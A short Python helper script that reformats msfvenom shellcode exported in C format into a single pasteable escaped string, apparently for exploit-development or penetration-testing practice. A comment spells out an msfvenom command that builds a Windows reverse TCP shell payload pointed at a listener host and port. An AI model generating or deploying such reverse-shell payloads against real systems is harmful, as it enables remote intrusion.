#!/bin/python3

#This script converts shellcode originally exported in c format into "copy-able" format.
#eg) \x0a\x2b...


#First export shellcode in format 'c' by, for example,
#'msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=9999 -f c -b "\x00\x0a\x0d\xff" -o shellcode.txt


with open('shellcode.txt') as file:
	content = file.readlines()

#Removes the first line
content = content[1:]
#Removes the last semicolon in the last line
content[-1] = content[-1][0:-1]

#Removes \n and "
for i in range(len(content)):
	content[i] = content[i][1:-2]

#Reassembly
string = ''
for line in content:
	string += line

#Save back as 'shellcode.txt'
with open('shellcode.txt','w') as file:
	file.write(string)
